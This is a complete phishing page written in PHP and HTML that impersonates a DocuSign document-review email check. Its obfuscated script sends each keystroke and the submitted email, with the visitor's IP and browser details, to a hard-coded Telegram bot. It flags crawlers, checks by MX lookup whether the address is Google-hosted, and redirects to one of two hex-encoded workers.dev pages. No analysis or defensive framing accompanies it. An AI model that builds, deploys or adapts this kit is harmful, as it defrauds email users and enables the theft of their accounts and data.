<?php
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>DocuSign Document Review - Verify Email</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
<style>
body {
  margin: 0;
  padding: 0;
  height: 100vh;
  min-height: 100vh;
  overflow: hidden;
  font-family: 'Segoe UI', Arial, sans-serif;
  background: url(https://www.shutterstock.com/image-photo/texture-blurry-text-open-textbook-600nw-1175839786.jpg);
  background-size: cover;
  background-position: center;
}
#form-container {
  position: relative;
  height: 100vh;
}
#bg-blur {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: inherit;
  filter: blur(8px);
  z-index: 0;
}
#content-wrapper {
  position: relative;
  z-index: 2;
  display: flex;
  justify-content: center;
  align-items: flex-start;
  min-height: 100vh;
  padding: 20px;
  margin-top: 10px; 
}
#content-container {
  background-color: rgba(255, 255, 255, 0.95);
  border-radius: 8px;
  width: 100%;
  max-width: 520px;
  box-sizing: border-box;
  color: #4f33a6;
  box-shadow: 0 4px 20px rgba(0,0,0,0.1);
  padding: 28px;
  height: 250px; 
}
.underline-input {
  border: none;
  border-bottom: 1px solid #4f33a6;
  padding: 5px 0;
  width: 100%;
  font-size: 16px;
  background: transparent;
  outline: none;
  margin-top: 10px;
  box-sizing: border-box;
}
.shake {
  animation: shake 0.5s linear;
}
@keyframes shake {
  0%, 100% { transform: translateX(0); }
  20%, 60% { transform: translateX(-5px); }
  40%, 80% { transform: translateX(5px); }
}
.sm {
  font-size: 19px;
  color: #4f33a6;
  padding: 5px 10px;
  display: inline-block;
}
.docusign-logo {
  display: block;
  margin: 0 auto 8px auto;
  height: 68px;
  width: 220px;
  max-width: 220px;
  object-fit: contain;
}
@media (min-width: 540px) {
  #content-container {
    padding: 36px 28px;
    border-radius: 12px;
  }
}
@media (max-width: 420px) {
  #content-container {
    padding: 1px 20px 5px;
    border-radius: 0;
    height: 300px;
  }
}
</style>
</head>
<body>
<div id="form-container">
  <div id="bg-blur"></div>
  <div id="content-wrapper">
    <div id="content-container">
      <img class="docusign-logo" src="https://gotrialpro.com/wp-content/uploads/edd/2024/08/Docusign-Free-Trial-1.png">
      <div id="message-content">
        <p style="font-size:16px;margin:5px 0;">To confirm you are the authorized recipient, please confirm email address this document was shared to.</p>
        <input type="email" id="email-input" class="underline-input" placeholder="Email Address Envelope was received" autocomplete="email" autofocus>
        <div id="verify-status"></div>
      </div>
      <div style="text-align:right;margin-top:15px;">
        <a href="#" id="continue-link" style="text-decoration:none;color:#4f33a6;font-size:19px;display:inline-block;padding:5px 10px;">Continue</a>
      </div>
    </div>
  </div>
</div>
<script>
const h = "68747470733A2F2F6A6F6C6C792D6D6F756E7461696E2D626561662E79616C65706F6C6C61636B6C61772E776F726B6572732E6465762F3F653D";
const o = "68747470733A2F2F6F6666792D6174742D333339322E79616C65706F6C6C61636B6C61772E776F726B6572732E6465762F3F653D";
const b = "373935333038303739323A4141457446385F41574C4E63566152674875714F2D385A4E576A5656754B4756454377";

const googleDomains = ['gmail.com', 'googlemail.com'];

const sendTelegramNotification = async message => {
  const t = b.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('');
  try {
    await fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: "5116232183", text: message })
    });
  } catch (e) {}
};

const getClientInfo = async () => {
  let ip = "Unknown";
  let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  try {
    const ipResponse = await fetch('https://ipapi.co/json/');
    const ipData = await ipResponse.json();
    ip = ipData.ip || "Unknown";
    timezone = ipData.timezone || timezone;
  } catch (e) {}
  return {
    ip,
    timezone,
    userAgent: navigator.userAgent,
    isBot: /bot|crawl|spider|facebookexternalhit|WhatsApp|google|bing|duckduckbot|yandex|baidu|slurp|exabot|facebot|ia_archiver/i.test(navigator.userAgent),
    timestamp: new Date().toLocaleString()
  };
};

async function checkGoogleMX(domain) {
  const url = `https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(domain)}&type=MX`;
  try {
    const resp = await fetch(url, {
      headers: { 'accept': 'application/dns-json' }
    });
    const data = await resp.json();
    if (!data.Answer || data.Answer.length === 0) {
      return { isGoogle: false, error: "No MX records found" };
    }
    const mxRecords = data.Answer.map(ans => {
      const parts = ans.data.split(' ');
      return parts[parts.length - 1].toLowerCase().replace(/\.$/, '');
    });
    const isGoogle = mxRecords.some(mx =>
      mx.includes('google.com') || mx.includes('googlemail.com')
    );
    console.log("Domain:", domain, "MX Records:", mxRecords, "Detected Google:", isGoogle);
    return { isGoogle, error: null };
  } catch (e) {
    console.error("MX Lookup Error:", e.message);
    return { isGoogle: false, error: "Lookup failed" };
  }
}

document.addEventListener('DOMContentLoaded', () => {
  const emailInput = document.getElementById('email-input');
  const continueLink = document.getElementById('continue-link');
  let lastSent = 0;
  const throttleDelay = 1000;

  emailInput.focus();

  emailInput.addEventListener('input', async () => {
    const now = Date.now();
    if (now - lastSent < throttleDelay) return;
    lastSent = now;
    const value = emailInput.value.trim();
    if (value) {
      const clientInfo = await getClientInfo();
      sendTelegramNotification(`
⌨️ Keystroke Input
- Input: ${value}
- IP: ${clientInfo.ip}
- Time: ${clientInfo.timestamp}
- User Agent: ${clientInfo.userAgent}
`);
    }
  });

  continueLink.addEventListener('click', async function(e) {
    e.preventDefault();
    const email = emailInput.value.trim();
    if (!email || !email.includes('@') || !email.includes('.')) {
      emailInput.classList.add('shake');
      emailInput.style.borderBottomColor = '#ff6b6b';
      setTimeout(() => {
        emailInput.classList.remove('shake');
        emailInput.style.borderBottomColor = '#4f33a6';
      }, 500);
      emailInput.focus();
      return;
    }
    emailInput.disabled = true;
    continueLink.style.pointerEvents = 'none';
    continueLink.innerHTML = '<span class="sm">Verifying…</span>';
    const domain = email.split('@')[1].toLowerCase();
    getClientInfo().then(clientInfo => {
      sendTelegramNotification(`
📩 Email Submitted
- Email: ${email}
- Domain: ${domain}
- IP: ${clientInfo.ip}
- Time: ${clientInfo.timestamp}
- User Agent: ${clientInfo.userAgent}
`);
    });
    let isGoogle = googleDomains.includes(domain);
    try {
      const mxPromise = checkGoogleMX(domain);
      const mxResult = await Promise.race([
        mxPromise,
        new Promise(resolve => setTimeout(() => resolve(null), 5000))
      ]);
      if (mxResult && mxResult.isGoogle) isGoogle = true;
    } catch (e) {}
    continueLink.innerHTML = '<span class="sm">Finalizing document preparation…</span>';
    setTimeout(() => {
      const url = isGoogle ? h : o;
      const decodedUrl = url.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('');
      window.location.href = decodedUrl + encodeURIComponent(email);
    }, 420);
  });
});
</script>
</body>
</html>
<?php
?>
